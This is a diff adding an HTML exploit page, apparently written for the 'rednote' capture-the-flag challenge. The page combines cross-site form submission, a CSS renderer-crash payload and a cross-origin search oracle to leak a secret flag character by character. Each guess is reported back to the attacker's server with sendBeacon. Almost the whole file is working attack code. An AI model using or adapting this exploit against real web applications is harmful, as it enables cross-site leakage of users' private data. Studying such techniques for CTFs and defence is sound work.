@@ -1,0 +1,99 @@
+<html>
+<body>
+  <iframe sandbox="allow-forms allow-scripts allow-popups" srcdoc=""></iframe>
+  <script>
+    const $ = document.querySelector.bind(document);
+    const params = new URLSearchParams(location.search);
+
+    const TARGET = "http://rednote.chals.sekai.team"; // TODO: CHANGE THIS
+    let KNOWN = params.get("k") || "SEKAI{";
+    let ALPHABET = "}_abcdefghijklmnopqrstuvwxyz".substring("}_abcdefghijklmnopqrstuvwxyz".indexOf(location.hash.slice(1)));
+  
+    const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+    const frameHTML = `
+      <form method=POST action="${TARGET}/create" target="pepega">
+        <input name=title>
+        <input name=note>
+      </form>
+      <script>
+        const createNote = async (title, note) => {
+          w = window.open("", "pepega");
+          document.querySelector("input[name=title]").value = title;
+          document.querySelector("input[name=note]").value = note;
+          document.forms[0].submit();
+          await new Promise(r => setTimeout(r, 1500));
+          w.close();
+        };
+        window.onmessage = (e) => {
+          if (e.data.title && e.data.note) createNote(e.data.title, e.data.note);
+        };
+      </scr${""}ipt>
+    `;
+    const frame = $("iframe");
+    frame.srcdoc = frameHTML;
+
+    const cssCrash = `
+      hihi
+      <style>
+        @starting-style {
+          *::first-letter {
+            color: red;
+          }
+        }
+      </style>
+    `.split("\n").map(s => s.trim()).join("");
+
+    const createNote = (title, note) => {
+      frame.contentWindow.postMessage({ title, note }, "*");
+    };
+
+    const oracle = async (q) => {
+      createNote(q, cssCrash);
+      await sleep(1500);
+
+      const url = `${TARGET}/search?query=${encodeURIComponent(q)}`;
+
+      w = window.open(url);
+      await new Promise(r => setTimeout(r, 2000));
+      w.location = "about:blank";
+      w.location = url + "#" + Math.random();
+      await new Promise(r => setTimeout(r, 200));
+      let result;
+      try {
+        w.location.href;
+        result = false;
+      } catch {
+        result = true;
+      }
+      w.close();
+  
+      return result;
+    }
+
+    window.onload = async () => {
+      if (params.has("debug")) return;
+      await sleep(1000);
+      while (!KNOWN.endsWith("}")) {
+        for (const c of ALPHABET) {
+          await sleep(1000);
+          const query = KNOWN + c;
+          document.title = `testing: ${query}`;
+          if (await oracle(query)) {
+            navigator.sendBeacon("/correct_" + query);
+            ALPHABET = "}_abcdefghijklmnopqrstuvwxyz";
+            KNOWN = query;
+            document.title = `correct: ${query}`;
+            break;
+          }
+          else {
+            navigator.sendBeacon("/incorrect_" + query);
+            document.title = `incorrect: ${query}`;
+          }
+        }
+      }
+    }
+
+  </script>
+</body>
+</html>
